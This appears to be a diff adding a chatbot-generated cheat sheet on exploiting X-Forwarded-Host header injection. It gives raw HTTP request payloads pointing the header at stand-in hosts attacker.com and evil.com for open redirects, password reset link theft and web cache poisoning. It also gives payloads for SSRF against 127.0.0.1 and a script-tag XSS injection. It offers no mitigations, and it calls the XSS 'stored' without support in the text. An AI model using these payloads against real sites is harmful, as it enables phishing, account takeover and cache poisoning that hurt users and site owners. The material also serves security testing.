@@ -1,0 +1,78 @@
+1️⃣ How X-Forwarded-Host Works
+Normally, a request from a client goes through a proxy before reaching the web server:
+
+makefile
+Copy
+Edit
+GET / HTTP/1.1
+Host: victim.com
+X-Forwarded-Host: original-client.com
+The backend trusts X-Forwarded-Host and generates responses based on it.
+If improperly handled, attackers can inject arbitrary values.
+2️⃣ Common Exploitable Scenarios
+Vulnerability	Impact
+Phishing (Open Redirects)	Redirect users to an attacker's domain
+Password Reset Hijacking	Capture password reset links
+Web Cache Poisoning	Poison cache with malicious responses
+SSRF (Server-Side Request Forgery)	Trick server into making internal requests
+XSS (Cross-Site Scripting)	Inject JavaScript via Host header
+3️⃣ Exploit Payloads
+🔹 Basic Injection Test
+Check if the server reflects X-Forwarded-Host:
+
+makefile
+Copy
+Edit
+GET / HTTP/1.1
+Host: victim.com
+X-Forwarded-Host: attacker.com
+If the response includes attacker.com, the site is vulnerable.
+
+🔹 Phishing & Open Redirect Exploit
+If the site uses X-Forwarded-Host to construct URLs, inject a malicious host:
+
+makefile
+Copy
+Edit
+GET /login HTTP/1.1
+Host: victim.com
+X-Forwarded-Host: evil.com
+If the response contains:
+
+php-template
+Copy
+Edit
+<a href="https://evil.com/reset-password?token=XYZ">
+🚀 Attackers can steal password reset links by redirecting users to evil.com.
+
+🔹 Web Cache Poisoning
+If the server caches responses based on X-Forwarded-Host, poison it:
+
+makefile
+Copy
+Edit
+GET /index.html HTTP/1.1
+Host: victim.com
+X-Forwarded-Host: attacker.com
+If cached, users visiting victim.com might receive attacker-controlled content.
+
+🔹 SSRF via Internal Host Access
+Access internal services by injecting internal IP addresses:
+
+makefile
+Copy
+Edit
+GET /admin HTTP/1.1
+Host: victim.com
+X-Forwarded-Host: 127.0.0.1
+🚀 If successful, this can expose internal admin panels.
+
+🔹 XSS via JavaScript Injection
+Some web apps reflect X-Forwarded-Host inside JavaScript:
+
+javascript
+Copy
+Edit
+X-Forwarded-Host: <script>alert('XSS')</script>
+🚀 If the app injects this into its HTML, it becomes a stored XSS attack.
+
